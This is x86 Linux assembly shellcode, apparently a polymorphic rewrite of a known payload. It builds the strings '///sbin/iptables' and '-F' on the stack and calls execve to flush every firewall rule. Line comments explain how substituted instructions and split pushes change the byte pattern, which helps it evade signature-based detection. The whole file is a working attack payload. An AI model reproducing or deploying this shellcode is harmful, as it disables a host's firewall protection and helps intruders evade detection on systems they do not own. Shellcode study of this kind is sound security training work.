global _start			

section .text
_start:

	;xor eax, eax
  ;push eax

	xor ebx, ebx             ; zero out EBX
	mul ebx                  ; multiply EBX with AL and store the result in AL, making AL equal to 0
  mov DWORD [esp-4], eax   ; move the value of EAX (00000000) to the memory address of [esp-4]
  sub esp, 4               ; readjust ESP to point to the address storing 00000000 by subtracting 4 from it

  ;push WORD 0x462d

  mov dx, 0x462d           ; move the WORD value of '0x462d' into DX
	mov WORD [esp-2], dx     ; move the value of DX (0x462d) to the memory address of [esp-2]
	sub esp, 2               ; readjust ESP to point to the address storing 0x462d by subtracting 2 from it

	mov esi, esp
	push eax
	push 0x73656c62
	push 0x61747069

	;push 0x2f6e6962
	
	push WORD 0x2f6e         ; split the above push DWORD instruction into 
	push WORD 0x6962         ; two separate push WORD instructions

	push 0x732f2f2f

	mov ebx, esp
	push eax
	push esi
	push ebx
	mov ecx, esp

	;mov edx, eax

	xor edx, edx             ; zero out edx

	;mov al, 0xb
	add al, 11               ; add 11 to AL

	int 0x80
